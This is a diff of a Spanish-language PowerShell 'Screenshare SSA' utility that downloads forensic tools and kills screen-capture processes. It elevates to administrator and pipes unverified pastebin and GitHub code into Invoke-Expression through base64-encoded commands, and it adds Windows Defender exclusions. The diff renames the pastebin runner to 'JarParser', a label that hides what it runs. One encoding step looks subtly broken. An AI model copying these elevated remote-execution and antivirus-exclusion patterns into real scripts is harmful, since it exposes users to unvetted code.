@@ -1,20 +1,34 @@
-# discord.gg/ssa
+# discord.gg/ssa 
 
 $global:version = "1.0.0"
 $global:isAdmin = $false
 
 
-$global:colors = @{
-    Red = "`e[91m"
-    Green = "`e[92m"
-    Yellow = "`e[93m"
-    Blue = "`e[94m"
-    Magenta = "`e[95m"
-    Cyan = "`e[96m"
-    White = "`e[97m"
-    Reset = "`e[0m"
+function Write-Color {
+    param(
+        [string]$Text,
+        [string]$Color = "White",
+        [switch]$NoNewline
+    )
+    
+    $colorMap = @{
+        Red = "Red"
+        Green = "Green"
+        Yellow = "Yellow"
+        Blue = "Blue"
+        Magenta = "Magenta"
+        Cyan = "Cyan"
+        White = "White"
+        Gray = "Gray"
+    }
+    
+    if ($NoNewline) {
+        Write-Host $Text -ForegroundColor $colorMap[$Color] -NoNewline
+    }
+    else {
+        Write-Host $Text -ForegroundColor $colorMap[$Color]
+    }
 }
-
 
 function Test-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -22,60 +36,55 @@ function Test-Administrator {
     return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-
 function Show-Banner {
     Clear-Host
     Write-Host ""
-    Write-Host "$($colors.Cyan)╔══════════════════════════════════════════════════════════╗$($colors.Reset)"
-    Write-Host "$($colors.Cyan)║                                                          ║$($colors.Reset)"
-    Write-Host "$($colors.Cyan)║$($colors.White)  Screenshare SSA v$version$($colors.Cyan)                      ║$($colors.Reset)"
-    Write-Host "$($colors.Cyan)║$($colors.White)       discord.gg/ssa      $($colors.Cyan)                     ║$($colors.Reset)"
-    Write-Host "$($colors.Cyan)║                                                          ║$($colors.Reset)"
-    Write-Host "$($colors.Cyan)╚══════════════════════════════════════════════════════════╝$($colors.Reset)"
+    Write-Host "========================================================" -ForegroundColor Cyan
+    Write-Host "              SCREENSHARE SSA v$global:version" -ForegroundColor Cyan
+    Write-Host "                 discord.gg/ssa" -ForegroundColor Cyan
+    Write-Host "========================================================" -ForegroundColor Cyan
     Write-Host ""
 }
 
 
-function Invoke-DoomsdayFucker {
-    Write-Host "$($colors.Yellow)[*] Iniciando Doomsday Fucker...$($colors.Reset)"
+function Invoke-JarParser {
+    Write-Color "[*] Iniciando JarParser..." "Yellow"
     
     if ($global:isAdmin) {
-        Write-Host "$($colors.Green)[+] Ya se ejecuta como administrador$($colors.Reset)"
+        Write-Color "[+] Ya se ejecuta como administrador" "Green"
         try {
-            Write-Host "$($colors.Yellow)[*] Ejecutando comando...$($colors.Reset)"
+            Write-Color "[*] Ejecutando comando..." "Yellow"
             Invoke-RestMethod -Uri 'https://pastebin.com/raw/bRGvrGSw' | Invoke-Expression
-            Write-Host "$($colors.Green)[+] Comando ejecutado exitosamente$($colors.Reset)"
+            Write-Color "[+] Comando ejecutado exitosamente" "Green"
         }
         catch {
-            Write-Host "$($colors.Red)[!] Error al ejecutar comando: $_$($colors.Reset)"
+            Write-Color "[!] Error al ejecutar comando: $_" "Red"
         }
     }
     else {
-        Write-Host "$($colors.Yellow)[*] Solicitando permisos de administrador...$($colors.Reset)"
+        Write-Color "[*] Solicitando permisos de administrador..." "Yellow"
         
         try {
-          
             $script = "irm 'https://pastebin.com/raw/bRGvrGSw' | iex"
             $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
             $encodedCommand = [Convert]::ToBase64String($bytes)
             
             Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
-            Write-Host "$($colors.Green)[+] Solicitud de elevación enviada$($colors.Reset)"
+            Write-Color "[+] Solicitud de elevación enviada" "Green"
         }
         catch {
-            Write-Host "$($colors.Red)[!] No se pudo elevar permisos$($colors.Reset)"
-            Write-Host "$($colors.Yellow)[*] Ejecuta manualmente como administrador:$($colors.Reset)"
-            Write-Host "$($colors.Green)   powershell -command `"irm 'https://pastebin.com/raw/bRGvrGSw' | iex`"$($colors.Reset)"
+            Write-Color "[!] No se pudo elevar permisos" "Red"
+            Write-Color "[*] Ejecuta manualmente como administrador:" "Yellow"
+            Write-Host "   powershell -command `"irm 'https://pastebin.com/raw/bRGvrGSw' | iex`"" -ForegroundColor Green
         }
     }
 }
 
-
 function Add-DefenderExclusion {
     param([string]$DownloadPath)
     
-    Write-Host "$($colors.Cyan)[*] Configurando exclusión de antivirus...$($colors.Reset)"
-    Write-Host "$($colors.White)[*] Agregando exclusión de Windows Defender para: $DownloadPath" -NoNewline
+    Write-Color "[*] Configurando exclusión de antivirus..." "Cyan"
+    Write-Color "[*] Agregando exclusión de Windows Defender para: $DownloadPath" "White" -NoNewline
     
     $success = $false
     
@@ -85,12 +94,12 @@ function Add-DefenderExclusion {
             if ($existingExclusions -notcontains $DownloadPath) {
                 Add-MpPreference -ExclusionPath $DownloadPath -ErrorAction Stop
             }
-            Write-Host "$($colors.Green) Éxito$($colors.Reset)"
+            Write-Color " Éxito" "Green"
             $success = $true
         }
     }
     catch {
-     
+      
     }
     
     if (-not $success) {
@@ -101,7 +110,7 @@ function Add-DefenderExclusion {
                 if (-not $existingValue) {
                     New-ItemProperty -Path $regPath -Name $DownloadPath -Value 0 -PropertyType DWORD -Force -ErrorAction Stop | Out-Null
                 }
-                Write-Host "$($colors.Green) Éxito$($colors.Reset)"
+                Write-Color " Éxito" "Green"
                 $success = $true
             }
         }
@@ -111,19 +120,18 @@ function Add-DefenderExclusion {
     }
     
     if (-not $success) {
-        Write-Host "$($colors.Red) Falló$($colors.Reset)"
+        Write-Color " Falló" "Red"
     }
     
     return $success
 }
-
 
 function Download-File {
     param([string]$Url, [string]$FileName, [string]$ToolName, [string]$DownloadPath)
     
     try {
         $outputPath = Join-Path $DownloadPath $FileName
-        Write-Host "$($colors.White)  Descargando $ToolName" -NoNewline
+        Write-Color "  Descargando $ToolName" "White" -NoNewline
         $ProgressPreference = 'SilentlyContinue'
         Invoke-WebRequest -Uri $Url -OutFile $outputPath -UserAgent "PowerShell" -UseBasicParsing | Out-Null
         
@@ -132,11 +140,11 @@ function Download-File {
             Expand-Archive -Path $outputPath -DestinationPath $extractPath -Force | Out-Null
             Remove-Item $outputPath -Force | Out-Null
         }
-        Write-Host "$($colors.Green) Listo$($colors.Reset)"
+        Write-Color " Listo" "Green"
         return $true
     }
     catch {
-        Write-Host "$($colors.Red) Falló$($colors.Reset)"
+        Write-Color " Falló" "Red"
         return $false
     }
     finally {
@@ -144,56 +152,52 @@ function Download-File {
     }
 }
 
-
 function Download-Tools {
     param([array]$Tools, [string]$CategoryName, [string]$DownloadPath)
     
     $successCount = 0
     
-    Write-Host "`n$($colors.Cyan)[*] Descargando herramientas $CategoryName$($colors.Reset)"
+    Write-Color "`n[*] Descargando herramientas $CategoryName" "Cyan"
     foreach ($tool in $Tools) {
         if (Download-File -Url $tool.Url -FileName $tool.File -ToolName $tool.Name -DownloadPath $DownloadPath) {
             $successCount++
         }
     }
     
-
-    Write-Host ("$($colors.Cyan)[+] {0}: {1}/{2} herramientas descargadas exitosamente$($colors.Reset)" -f $CategoryName, $successCount, $Tools.Count)
+    Write-Color "[+] $CategoryName`: $successCount/$($Tools.Count) herramientas descargadas exitosamente" "Cyan"
     return $successCount
 }
-
 
 function Invoke-SSADownloadSystem {
     Clear-Host
     
-    Write-Host @"
-$($colors.Cyan)   
-Discord.gg/ssa
-$($colors.Reset)
-$($colors.White)discord.gg/ssa$($colors.Reset)
-"@
-
-    Write-Host "`n$($colors.Red)[!] ADVERTENCIA: ASEGÚRATE DE TENER EL CONSENTIMIENTO DEL USUARIO ANTES DE EJECUTAR,$($colors.Reset)"
-    Write-Host "$($colors.Red)[!] EL SCRIPT AGREGARÁ C:\SCREENSHARE A LAS EXCLUSIONES DEL ANTIVIRUS.$($colors.Reset)"
     Write-Host ""
-    
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "       SISTEMA DE DESCARGAS SSA" -ForegroundColor Cyan
+    Write-Host "        discord.gg/ssa" -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    Write-Color "[!] ADVERTENCIA: ASEGÚRATE DE TENER EL CONSENTIMIENTO DEL USUARIO ANTES DE EJECUTAR" "Red"
+    Write-Color "[!] EL SCRIPT AGREGARÁ C:\SCREENSHARE A LAS EXCLUSIONES DEL ANTIVIRUS" "Red"
+    Write-Host ""
 
     if (-not $global:isAdmin) {
-        Write-Host "$($colors.Yellow)[!] Esta función requiere privilegios de administrador.$($colors.Reset)"
-        Write-Host "$($colors.Yellow)[*] Solicitando permisos de administrador...$($colors.Reset)"
+        Write-Color "[!] Esta función requiere privilegios de administrador" "Yellow"
+        Write-Color "[*] Solicitando permisos de administrador..." "Yellow"
         
         try {
-            $scriptContent = Get-Content $MyInvocation.MyCommand.Path -Raw
-            $bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptContent)
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes('& {irm "https://raw.githubusercontent.com/xsolary1234-hash/Screenshare-Alliance/main/SS.ps1" | iex}')
             $encodedCommand = [Convert]::ToBase64String($bytes)
             
             Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
-            Write-Host "$($colors.Green)[+] Script reiniciado como administrador$($colors.Reset)"
+            Write-Color "[+] Script reiniciado como administrador" "Green"
             exit
         }
         catch {
-            Write-Host "$($colors.Red)[!] No se pudieron obtener privilegios de administrador.$($colors.Reset)"
-            Write-Host "$($colors.White)[*] Presiona Enter para continuar...$($colors.Reset)"
+            Write-Color "[!] No se pudieron obtener privilegios de administrador" "Red"
+            Write-Host ""
+            Write-Color "[*] Presiona Enter para continuar..." "White"
             $null = Read-Host
             return
         }
@@ -202,18 +206,16 @@ $($colors.White)discord.gg/ssa$($colors.Reset)
     $DownloadPath = "C:\Screenshare"
     if (!(Test-Path $DownloadPath)) {
         New-Item -ItemType Directory -Path $DownloadPath -Force | Out-Null
-        Write-Host "$($colors.Green)[+] Carpeta creada: $DownloadPath$($colors.Reset)"
+        Write-Color "[+] Carpeta creada: $DownloadPath" "Green"
     }
-    
 
     $exclusionAdded = Add-DefenderExclusion -DownloadPath $DownloadPath
     
     if (-not $exclusionAdded) {
-        Write-Host "`n$($colors.Yellow)[!] No se pudo agregar la exclusión automática del antivirus.$($colors.Reset)"
-        Write-Host "$($colors.Yellow)[*] Continuando con las descargas (algunas podrían ser eliminadas)$($colors.Reset)"
-        Start-Sleep -Seconds 3
+        Write-Color "`n[!] No se pudo agregar la exclusión automática del antivirus" "Yellow"
+        Write-Color "[*] Continuando con las descargas (algunas podrían ser eliminadas)" "Yellow"
+        Start-Sleep -Seconds 2
     }
-    
 
     $spokwnTools = @(
         @{ Name="Kernel Live Dump Analyzer Parser"; Url="https://github.com/spokwn/KernelLiveDumpTool/releases/download/v1.1/KernelLiveDumpTool.exe"; File="KernelLiveDumpTool.exe" },
@@ -261,30 +263,29 @@ $($colors.White)discord.gg/ssa$($colors.Reset)
         @{ Name="FTK Imager"; Url="https://d1kpmuwb7gvu1i.cloudfront.net/AccessData_FTK_Imager_4.7.1.exe"; File="AccessData_FTK_Imager_4.7.1.exe" }
     )
     
-
-    Write-Host "`n$($colors.Cyan)[*] Sistema de descargas de herramientas forenses$($colors.Reset)"
-    Write-Host "$($colors.Cyan)[*] Todas las herramientas se guardarán en: $DownloadPath$($colors.Reset)"
+    Write-Color "`n[*] Sistema de descargas de herramientas forenses" "Cyan"
+    Write-Color "[*] Todas las herramientas se guardarán en: $DownloadPath" "Cyan"
     Write-Host ""
     
     $totalDownloaded = 0
     
-    $response = Read-Host "$($colors.Yellow)[?] ¿Quieres descargar las herramientas de Spokwn? (S/N)$($colors.Reset)"
+    $response = Read-Host "[?] ¿Quieres descargar las herramientas de Spokwn? (S/N)"
     if ($response -match '^[SsYy]') {
         $count = Download-Tools -Tools $spokwnTools -CategoryName "Spokwn" -DownloadPath $DownloadPath
         $totalDownloaded += $count
     }
     
-    $response = Read-Host "`n$($colors.Yellow)[?] ¿Quieres descargar las herramientas de Orbdiff? (S/N)$($colors.Reset)"
+    $response = Read-Host "`n[?] ¿Quieres descargar las herramientas de Orbdiff? (S/N)"
     if ($response -match '^[SsYy]') {
         $count = Download-Tools -Tools $OrbdiffTools -CategoryName "Orbdiff" -DownloadPath $DownloadPath
         $totalDownloaded += $count
     }
     
-    $response = Read-Host "`n$($colors.Yellow)[?] ¿Quieres descargar las herramientas de Zimmerman? (S/N)$($colors.Reset)"
+    $response = Read-Host "`n[?] ¿Quieres descargar las herramientas de Zimmerman? (S/N)"
     if ($response -match '^[SsYy]') {
         $count = Download-Tools -Tools $zimmermanTools -CategoryName "Zimmerman" -DownloadPath $DownloadPath
         
-        $runtimeResponse = Read-Host "$($colors.Yellow)[?] ¿Quieres instalar el .NET Runtime (requerido para Zimmerman)? (S/N)$($colors.Reset)"
+        $runtimeResponse = Read-Host "[?] ¿Quieres instalar el .NET Runtime (requerido para Zimmerman)? (S/N)"
         if ($runtimeResponse -match '^[SsYy]') {
             Download-File -Url "https://builds.dotnet.microsoft.com/dotnet/Sdk/9.0.306/dotnet-sdk-9.0.306-win-x64.exe" -FileName "dotnet-sdk-9.0.306-win-x64.exe" -ToolName ".NET Runtime" -DownloadPath $DownloadPath
             $totalDownloaded++
@@ -292,46 +293,46 @@ $($colors.White)discord.gg/ssa$($colors.Reset)
         $totalDownloaded += $count
     }
     
-    $response = Read-Host "`n$($colors.Yellow)[?] ¿Quieres descargar las herramientas de Nirsoft? (S/N)$($colors.Reset)"
+    $response = Read-Host "`n[?] ¿Quieres descargar las herramientas de Nirsoft? (S/N)"
     if ($response -match '^[SsYy]') {
         $count = Download-Tools -Tools $nirsoftTools -CategoryName "Nirsoft" -DownloadPath $DownloadPath
         $totalDownloaded += $count
     }
     
-    Write-Host "`n$($colors.Yellow)[!] NOTA: Hayabusa puede ser detectado como virus (es seguro y de código abierto)$($colors.Reset)"
-    $response = Read-Host "$($colors.Yellow)[?] ¿Quieres descargar Hayabusa? (S/N)$($colors.Reset)"
+    Write-Color "`n[!] NOTA: Hayabusa puede ser detectado como virus (es seguro y de código abierto)" "Yellow"
+    $response = Read-Host "[?] ¿Quieres descargar Hayabusa? (S/N)"
     if ($response -match '^[SsYy]') {
         if (Download-File -Url "https://github.com/Yamato-Security/hayabusa/releases/download/v3.6.0/hayabusa-3.6.0-win-x64.zip" -FileName "hayabusa-3.6.0-win-x64.zip" -ToolName "Hayabusa" -DownloadPath $DownloadPath) {
             $totalDownloaded++
         }
     }
     
-    $response = Read-Host "`n$($colors.Yellow)[?] ¿Quieres descargar otras herramientas comunes? (S/N)$($colors.Reset)"
+    $response = Read-Host "`n[?] ¿Quieres descargar otras herramientas comunes? (S/N)"
     if ($response -match '^[SsYy]') {
         $count = Download-Tools -Tools $otherTools -CategoryName "Otras herramientas" -DownloadPath $DownloadPath
         $totalDownloaded += $count
     }
     
-    Write-Host "`n$($colors.Green)[+] Descarga completada!$($colors.Reset)"
-    Write-Host "$($colors.Cyan)[*] Total de herramientas descargadas: $totalDownloaded$($colors.Reset)"
+    Write-Color "`n[+] Descarga completada!" "Green"
+    Write-Color "[*] Total de herramientas descargadas: $totalDownloaded" "Cyan"
     
-    $response = Read-Host "`n$($colors.Yellow)[?] ¿Quieres abrir la carpeta $DownloadPath? (S/N)$($colors.Reset)"
+    $response = Read-Host "`n[?] ¿Quieres abrir la carpeta $DownloadPath? (S/N)"
     if ($response -match '^[SsYy]') {
         Start-Process $DownloadPath
     }
     
-    Write-Host "`n$($colors.Cyan)[*] Las descargas se encuentran en: $DownloadPath$($colors.Reset)"
-    Write-Host "$($colors.White)[*] Presiona Enter para continuar...$($colors.Reset)"
+    Write-Color "`n[*] Las descargas se encuentran en: $DownloadPath" "Cyan"
+    Write-Host ""
+    Write-Color "[*] Presiona Enter para continuar..." "White"
     $null = Read-Host
 }
 
-# Función Kill Screen Processes (Script by diff)
 function Invoke-KillScreenProcesses {
     Clear-Host
     
-    Write-Host "$($colors.Green)======================================================$($colors.Reset)"
-    Write-Host "$($colors.Green)   Killer Capture Screen Processes made by Diff$($colors.Reset)"
-    Write-Host "$($colors.Green)======================================================$($colors.Reset)"
+    Write-Host "======================================================" -ForegroundColor Green
+    Write-Host "   Killer Capture Screen Processes made by Diff" -ForegroundColor Green
+    Write-Host "======================================================" -ForegroundColor Green
     Write-Host ""
     
     $forbiddenProcesses = @(
@@ -387,108 +388,112 @@ function Invoke-KillScreenProcesses {
     }
 
     if ($detected.Count -eq 0) {
-        Write-Host "$($colors.Green)[+] No forbidden or capture processes detected.$($colors.Reset)"
-        Write-Host "`n$($colors.White)Presiona Enter para continuar...$($colors.Reset)"
+        Write-Color "[+] No forbidden or capture processes detected" "Green"
+        Write-Host ""
+        Write-Color "[*] Presiona Enter para continuar..." "White"
         $null = Read-Host
         return
     }
 
-    Write-Host "$($colors.Yellow)[!] Detected processes:$($colors.Reset)"
+    Write-Color "[!] Detected processes:" "Yellow"
     Write-Host ""
 
     foreach ($item in $detected.Values) {
-        Write-Host "$($colors.Cyan)  - $($item.Name).exe [$($item.Type)]$($colors.Reset)"
+        Write-Host "  - $($item.Name).exe [$($item.Type)]" -ForegroundColor Cyan
     }
 
     Write-Host ""
-    Write-Host "$($colors.White)[A] Kill all detected processes.$($colors.Reset)"
-    Write-Host "$($colors.White)[B] Kill 1 specific process.$($colors.Reset)"
-    Write-Host "$($colors.White)[C] Kill all except 1 process.$($colors.Reset)"
-    Write-Host "$($colors.White)[X] Cancelar y volver al menú.$($colors.Reset)"
+    Write-Color "[A] Kill all detected processes" "White"
+    Write-Color "[B] Kill 1 specific process" "White"
+    Write-Color "[C] Kill all except 1 process" "White"
+    Write-Color "[X] Cancelar y volver al menú" "White"
     Write-Host ""
 
-    $choice = Read-Host "$($colors.Yellow)Select option (A / B / C / X)$($colors.Reset)"
+    $choice = Read-Host "[?] Select option (A / B / C / X)"
 
     switch ($choice.ToUpper()) {
         "A" {
             foreach ($item in $detected.Values) {
-                Get-Process -Name $item.Name -ErrorAction SilentlyContinue |
-                    Stop-Process -Force
-                Write-Host "$($colors.Red)[Terminated] $($item.Name).exe$($colors.Reset)"
+                Get-Process -Name $item.Name -ErrorAction SilentlyContinue | Stop-Process -Force
+                Write-Host "[Terminated] $($item.Name).exe" -ForegroundColor Red
             }
-            Write-Host "$($colors.Green)[+] All processes terminated.$($colors.Reset)"
+            Write-Color "[+] All processes terminated" "Green"
         }
 
         "B" {
-            $target = Read-Host "$($colors.Yellow)Enter process name (example: chrome or chrome.exe)$($colors.Reset)"
+            $target = Read-Host "[?] Enter process name (example: chrome or chrome.exe)"
             $target = $target.ToLower().Replace(".exe","")
 
             if ($detected.ContainsKey($target)) {
-                Get-Process -Name $target -ErrorAction SilentlyContinue |
-                    Stop-Process -Force
-                Write-Host "$($colors.Red)[Terminated] $target.exe$($colors.Reset)"
+                Get-Process -Name $target -ErrorAction SilentlyContinue | Stop-Process -Force
+                Write-Host "[Terminated] $target.exe" -ForegroundColor Red
             } else {
-                Write-Host "$($colors.Red)[Error] Process not found.$($colors.Reset)"
+                Write-Color "[Error] Process not found" "Red"
             }
         }
 
         "C" {
-            $exclude = Read-Host "$($colors.Yellow)Enter process name to keep alive (example: chrome or chrome.exe)$($colors.Reset)"
+            $exclude = Read-Host "[?] Enter process name to keep alive (example: chrome or chrome.exe)"
             $exclude = $exclude.ToLower().Replace(".exe","")
 
             if (-not $detected.ContainsKey($exclude)) {
-                Write-Host "$($colors.Red)[Error] Process not found.$($colors.Reset)"
+                Write-Color "[Error] Process not found" "Red"
                 return
             }
 
             foreach ($key in $detected.Keys) {
                 if ($key -ne $exclude) {
-                    Get-Process -Name $key -ErrorAction SilentlyContinue |
-                        Stop-Process -Force
-                    Write-Host "$($colors.Red)[Terminated] $key.exe$($colors.Reset)"
+                    Get-Process -Name $key -ErrorAction SilentlyContinue | Stop-Process -Force
+                    Write-Host "[Terminated] $key.exe" -ForegroundColor Red
                 }
             }
 
-            Write-Host "$($colors.Green)[+] Kept alive: $exclude.exe$($colors.Reset)"
+            Write-Color "[+] Kept alive: $exclude.exe" "Green"
         }
         
         "X" {
-            Write-Host "$($colors.Yellow)[*] Cancelado, volviendo al menú principal...$($colors.Reset)"
+            Write-Color "[*] Cancelado, volviendo al menú principal..." "Yellow"
             return
         }
         
         default {
-            Write-Host "$($colors.Red)[!] Opción no válida$($colors.Reset)"
+            Write-Color "[!] Opción no válida" "Red"
         }
     }
     
-    Write-Host "`n$($colors.White)Presiona Enter para continuar...$($colors.Reset)"
+    Write-Host ""
+    Write-Color "[*] Presiona Enter para continuar..." "White"
     $null = Read-Host
 }
-
 
 function Show-Menu {
     Show-Banner
     
-    Write-Host "`n$($colors.Cyan)$('='*60)$($colors.Reset)"
-    Write-Host "$($colors.Cyan)         SCREENSHARE - MENÚ PRINCIPAL$($colors.Reset)"
-    Write-Host "$($colors.Cyan)$('='*60)$($colors.Reset)"
+    Write-Host "========================================================" -ForegroundColor Cyan
+    Write-Host "                MENÚ PRINCIPAL SSA" -ForegroundColor Cyan
+    Write-Host "========================================================" -ForegroundColor Cyan
     
     do {
-        Write-Host "`n$($colors.White)Selecciona una opción:$($colors.Reset)"
-        Write-Host "$($colors.Cyan)1.$($colors.Reset) Ejecutar Doomsday Fucker"
-        Write-Host "$($colors.Cyan)2.$($colors.Reset) Sistema de descargas"
-        Write-Host "$($colors.Cyan)3.$($colors.Reset) Kill Screen Processes (by Diff)"
-        Write-Host "$($colors.Cyan)4.$($colors.Reset) Salir"
-        Write-Host "$($colors.Cyan)$('-'*60)$($colors.Reset)"
+        Write-Host ""
+     
+        Write-Color "[1] Ejecutar JarParser" "White"
+        Write-Color "[2] Sistema de descargas" "White"
+        Write-Color "[3] Kill Screen Processes (by Diff)" "White"
+        Write-Color "[4] Salir" "White"
+        Write-Host ""
+        Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
         
-        $choice = Read-Host "`n$($colors.Yellow)Opción$($colors.Reset)"
+        $choice = Read-Host "[?] Opción (1-4)"
         
         switch ($choice) {
             "1" {
-                Write-Host "`n$($colors.Yellow)[*] Iniciando Doomsday Fucker...$($colors.Reset)"
-                Write-Host "$($colors.Yellow)[!] Esta opción requiere permisos de administrador$($colors.Reset)"
-                Invoke-DoomsdayFucker
+                Write-Host ""
+              
+                Write-Color "[*] Iniciando JarParser..." "Yellow"
+                Write-Color "[!] Esta opción requiere permisos de administrador" "Yellow"
+                Write-Host ""
+            
+                Invoke-JarParser
             }
             "2" {
                 Invoke-SSADownloadSystem
@@ -501,42 +506,41 @@ function Show-Menu {
                 continue
             }
             "4" {
-                Write-Host "`n$($colors.Green)[+] Saliendo... ¡Hasta pronto!$($colors.Reset)"
+                Write-Host ""
+                Write-Color "[+] Saliendo... ¡Hasta pronto!" "Green"
                 break
             }
             default {
-                Write-Host "$($colors.Red)[!] Opción no válida$($colors.Reset)"
+                Write-Color "[!] Opción no válida" "Red"
+                Start-Sleep -Seconds 1
             }
         }
         
         if ($choice -ne "4" -and $choice -ne "2" -and $choice -ne "3") {
-            Write-Host "`n$($colors.White)Presiona Enter para continuar...$($colors.Reset)"
+            Write-Host ""
+            Write-Color "[*] Presiona Enter para continuar..." "White"
             $null = Read-Host
             Show-Banner
         }
     } while ($choice -ne "4")
     
-    Write-Host "`n$($colors.Cyan)$('='*60)$($colors.Reset)"
-    Write-Host "$($colors.Cyan)               discord.gg/ssa$($colors.Reset)"
-    Write-Host "$($colors.Cyan)$('='*60)$($colors.Reset)"
+    Write-Host ""
+    Write-Host "========================================================" -ForegroundColor Cyan
+    Write-Host "               discord.gg/ssa" -ForegroundColor Cyan
+    Write-Host "========================================================" -ForegroundColor Cyan
 }
 
-
 function Main {
-
-    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-    
- 
     $global:isAdmin = Test-Administrator
     
     try {
         Show-Menu
     }
     catch {
-        Write-Host "$($colors.Red)[!] Error crítico: $_$($colors.Reset)"
+        Write-Color "[!] Error crítico: $_" "Red"
+        Write-Host ""
         Read-Host "Presiona Enter para salir..."
     }
 }
-
 
 Main
